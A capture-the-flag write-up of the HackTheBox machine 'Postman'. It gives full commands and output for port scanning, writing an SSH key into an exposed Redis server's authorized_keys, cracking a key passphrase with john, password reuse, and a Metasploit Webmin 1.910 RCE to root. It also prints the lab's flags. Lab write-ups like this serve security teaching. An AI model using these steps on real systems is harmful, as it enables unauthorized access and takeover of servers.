---
layout: post
title: "HackTheBox :: Postman"
categories: writeups
---

# HackTheBox :: Postman

## Initial Enumeration

To start, let's run a basic nmap scan to see what's running on the server's TCP ports.
```
nmap -sCSV 10.10.10.160

Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-30 15:42 AEDT
Nmap scan report for 10.10.10.160
Host is up (0.055s latency).
Not shown: 997 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
<br />

What's that? An open Webmin service? That could be interesting. We also have an http service running on port 80, we'll probably check that out later too. But before any of that, let's run a *slightly* more extensive port map.
```
$ nmap -sCSV -p 1-20000 10.10.10.160

Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-30 15:47 AEDT
Nmap scan report for 10.10.10.160
Host is up (0.055s latency).
Not shown: 19996 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
<br />

Now *that* is interesting. An open Redis server. I think we just found our way in, but we can check the HTTP ports later if necessary.

## Initial Foothold
Okay, so, there is a well-known method you can use to exploit open Redis servers for RCE. You can read the method [here](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html). The main issue with this vulnerability, is that you are able to write files to the server.

Let's get stuck into this method. You will need `redis-cli` before you get started.

### SSH Key Generation
First step is to generate a new SSH key, as we can write it to the server using Redis.
```
$ ssh-keygen -t rsa -C "foo@bar"

Generating public/private rsa key pair.
Enter file in which to save the key (/home/username/.ssh/id_rsa): ./ssh_redis
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./ssh_redis.
Your public key has been saved in ./ssh_redis.pub.
The key fingerprint is:
SHA256:VgShVBnxU9zvX6Few1RGSxknXXiMmOUJsl9ZZApTUCQ foo@bar
The key's randomart image is:
+---[RSA 3072]----+
|      ..**o.EX*X@|
|     . ..o ++*=OO|
|      .   =   *=.|
|         . o . o.|
|        S   . +..|
|       .     . +o|
|            . . +|
|             .  .|
|                 |
+----[SHA256]-----+
```
<br />

Next, we'll have to surround our key with newlines. We need to do this as the key will be stored in the Redis server's memory - which in theory can compress strings, this should hopefully maintain the integrity of our SSH key.
```
$ (echo -e "\n\n"; cat ssh_redis.pub; echo -e "\n\n") > ssh_redis.txt
```
<br />

### Storing the SSH Key in Redis
Now we can get started with the actual exploit. We'll start by flushing all commands on the Redis server and storing the contents of our `ssh_redis.txt` inside a key-value pair.
```
$ redis-cli -h 10.10.10.160 flushall
OK
$ cat ssh_redis.txt | redis-cli -h 10.10.10.160 -x set exploit
OK
```
<br />

Awesome, let's check if our key is correctly stored on the Redis server.
```
$ redis-cli -h 10.10.10.160
10.10.10.160:6379> get exploit
"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYs2g4+kkvfppjRQu7sBYovd2JosfOz+glXU/5q9ZpVvQEFOPMySLc
k/q9Gcr2ItQ2hAjs6i1lSCkdkMGVv9MPv6d/28uW16d8sl8cAvVBqWskewSrMpDK9fhoO+0TwZp+r1N0c5/RaNDpAqURvuQOeSm
pbBCR3+996fPLWuBO2CO2kwwBgsthxU8dT0m6IebImyRHuzdZFKg2YfHRPrt1vS71p3CAzdxPUqpXwp9PPbxwpQ7Qwqb9BtNR9t
LYXy2dKBQWeJV+vL7chb2/fAEOUGIorOei31rdWeZoVKZ8ZHHIzEebdpjSnkeQ/KkiZ7iQgtwskrg23KbVfTqjSO08rLGxnOYnq
KAtT+wW6dlTAFiX2EA0EFVJJPHzchGmfRQDvsJNyBw8TsUBfpxjDyxXy4fTNWDpOQTqpCVt/jrGMVNKJPLagRpqb3748Kk6Yx06
aqAhhoCXTMf+5X/nuKq454W6g2pYXl4sk0901ePEHT4oWw9PuHLKmrGWMf1OezE= foo@bar\n\n\n\n"
```
<br />

Perfect.

### Writing the SSH Key to the Server
Next, we'll need to write our SSH key to one of the users' `.ssh/authorized_keys` file. But this is an issue, we don't know any of the users! Or do we? This is the first point where it's possible to trip up. We *do*, in fact, know one of the users. This user being `redis`. A quick google search shows that the default home directory for the `redis` user is at `/var/lib/redis`. Nice, let's exploit this.
```
$ redis-cli -h 10.10.10.160
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis/.ssh"
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
```
<br />

### Accessing the Server
Awesome! We now have an SSH key stored on the `redis` user. We can now SSH in.
```
$ ssh -i ssh_redis redis@10.10.10.160
redis@Postman:~$ ls
6379  dkixshbr.so  dump.rdb  ibortfgq.so  module.o  qcbxxlig.so  vlpaulhk.so
```
<br />

## Getting User
There doesn't appear to be anything interesting in redis' home directory, so we'll start with basic enumeration.
```
scp -i ssh_redis LinEnum.sh redis@10.10.10.160:/tmp/LinEnum.sh
```
```
redis@Postman:~$ sh /tmp/LinEnum.sh

...

-e [-] Location and Permissions (if accessible) of .bak file(s):
-rwxr-xr-x 1 Matt Matt 1743 Aug 26 00:11 /opt/id_rsa.bak

...
```
<br />

Wow, is that a backup of the user's `id_rsa`. I think it is. Let's download this and try to use it.
```
$ scp -i ssh_redis redis@10.10.10.160:/opt/id_rsa.bak ./ssh_Matt
id_rsa.bak                                                    100% 1743    31.0KB/s   00:00
$ ssh -i ssh_Matt Matt@10.10.10.160
Enter passphrase for key 'ssh_Matt':
```
<br />

Yeah, that was too easy. Of course it'd be password protected. Let's crack this SSH key.
```
$ /usr/share/john/ssh2john.py ssh_Matt > ssh_Matt.hash
$ john ssh_Matt.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 12 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (ssh_Matt)
1g 0:00:00:04 DONE (2019-12-30 16:50) 0.2493g/s 3576Kp/s 3576Kc/s 3576KC/s  0125457423 ..\*7¡Vamos!
Session completed
```
<br />

Nice, so the password for the SSH key is `computer2008`. Let's try to SSH in now.
```
ssh -i ssh_Matt Matt@10.10.10.160
Enter passphrase for key 'ssh_Matt': 
Connection closed by 10.10.10.160 port 22
```
<br />

Weird. It doesn't seem to be working. Let's try SSH'ing into the `redis` user and logging into Matt's account that way. Hopefully he re-used his password?
```
redis@Postman:~$ su - Matt
Password: 
Matt@Postman:~$
```
<br />

Nice. We have user.
```
Matt@Postman:~$ cat user.txt
517ad0ec2458ca97af8d93aac08a2f3c
```
<br />

## Getting Root
Since further enumeration inside the server doesn't seem to reveal anything, I think we should take a look at that Webmin server we found earlier.
```
$ searchsploit webmin
------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                           |  Path
                                                                         | (/usr/share/exploitdb/)
------------------------------------------------------------------------- ----------------------------------------
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)   | exploits/linux/remote/46984.rb
------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```
<br />

Very interesting. There seems to be an authenticated RCE vulnerability with the exact same version of Webmin that the server is running - and the server is running Webmin as root (we can see this looking at the webmin folder permissions), let's see what we can do with this.

Upon visiting the Webmin service, we can see a login page. Matt seems to like re-using credentials, so let's try his... they worked? We're in. So now we have the authentication for our authenticated RCE vulnerability that we discovered earlier. Let's boot up msfconsole and get a shell.

And... we are in!
```
root@Postman:~# ls
ls
redis-5.0.0  root.txt
root@Postman:~# cat root.txt
a257741c5bed8be7778c6ed95686ddce
```
<br />

## Lessons Learned
 * People like to re-use credentials, so try them in multiple places.
 * Redis is always vulnerable.
 * If there's no way to gain privilege escalation inside the server, look to the outside.
 * Search the name of the target technology on Google, searchsploit, CVE details, etc.
